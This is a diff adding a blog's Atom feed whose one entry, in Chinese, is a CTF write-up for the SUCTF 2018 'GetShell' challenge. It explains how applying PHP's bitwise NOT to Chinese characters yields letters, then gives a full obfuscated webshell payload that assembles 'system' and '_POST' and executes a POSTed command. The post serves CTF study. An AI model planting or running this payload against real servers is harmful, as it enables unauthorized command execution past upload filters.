@@ -1,0 +1,92 @@
+<?xml version="1.0"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <id>http://odiws.github.io</id>
+    <title>Hexo • Posts by &#34;文件内无字符rce&#34; tag</title>
+    <link href="http://odiws.github.io" />
+    <updated>2024-06-19T13:42:44.000Z</updated>
+    <category term="python" />
+    <category term="buuctf" />
+    <category term="文件内无字符rce" />
+    <category term="sql文件读取" />
+    <category term="ctf" />
+    <category term="文件上传" />
+    <category term="http" />
+    <category term="php原生类利用" />
+    <category term="php反序列化" />
+    <category term="md5()和sha1()对类进行hash 触发__toString方法" />
+    <category term="mongodb注入" />
+    <category term="cms框架" />
+    <category term="条件竞争：利用session.upload_progress" />
+    <category term="preg_match绕过" />
+    <category term="$_server query_string 绕过" />
+    <category term="$_request绕过" />
+    <category term="file_get_cotents绕过" />
+    <category term="sha1函数比较数组绕过" />
+    <category term="create_function运用" />
+    <category term="json数据爬虫" />
+    <category term="regexp注入" />
+    <category term="js" />
+    <category term="ECB加密" />
+    <category term="buuctf， 反序列化" />
+    <category term="phar反序列化" />
+    <category term="thinkphpV6.0.0" />
+    <category term="php7 segment fault特性" />
+    <category term="pickle反序列化" />
+    <category term="buuctf， 伪随机数" />
+    <category term="CRLF Injection" />
+    <category term="soap" />
+    <category term="zip加密" />
+    <category term="system_file" />
+    <entry>
+        <id>http://odiws.github.io/2024/06/19/2018-GetShell/</id>
+        <title>[suctf2018]GetShell</title>
+        <link rel="alternate" href="http://odiws.github.io/2024/06/19/2018-GetShell/"/>
+        <content type="html">&lt;h2 id=&#34;suctf2018getshell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#suctf2018getshell&#34;&gt;#&lt;/a&gt; [suctf2018]GetShell&lt;/h2&gt;
+&lt;p&gt;参考 p 神利用取反来获取可用字符：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;?php
+error_reporting(0);
+$a = ~垂;
+echo $a.&amp;quot;\n&amp;quot;;
+echo $a[1];
+/*
+运行得：
+a&amp;#125;
+a
+*/
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;🐎一下汉字：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;echo ~茉**[**$____**]**;//s
+
+echo ~内**[**$____**]**;//y
+
+echo ~茉**[**$____**]**;//s
+
+echo ~苏**[**$____**]**;//t
+
+echo ~的**[**$____**]**;//e
+
+echo ~咩**[**$____**]**;//m
+
+echo ~课**[**$____**]**;//P
+
+echo ~尬**[**$____**]**;//O
+
+echo ~笔**[**$____**]**;//S
+
+echo ~端**[**$____**]**;//T
+
+echo ~瞎**[**$____**]**;//a
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;构成🐎，POST 参数 a：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;?=$_=[];$__.=$_;$____=$_==$_;$___=~茉[$____];$___.=~内[$____];$___.=~茉[$____];$___.=~苏[$____];$___.=~的[$____];$___.=~咩[$____];$_____=_;$_____.=~课[$____];$_____.=~尬[$____];$_____.=~笔[$____];$_____.=~端[$____];$__________=$$_____;$___($__________[~瞎[$____]]);
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;![1](…/images/[SUCTF 2018]GetShell/1.png)&lt;/p&gt;
+&lt;h4 id=&#34;用env访问环境变量获得flag&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#用env访问环境变量获得flag&#34;&gt;#&lt;/a&gt; 用 env 访问环境变量获得 flag：&lt;/h4&gt;
+&lt;p&gt;参考自：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuc2hhd3Jvb3QuY2MvMTg1Ni5odG1s&#34;&gt;https://www.shawroot.cc/1856.html&lt;/span&gt;&lt;/p&gt;
+</content>
+        <category term="buuctf" />
+        <category term="文件内无字符rce" />
+        <updated>2024-06-19T13:42:44.000Z</updated>
+    </entry>
+</feed>
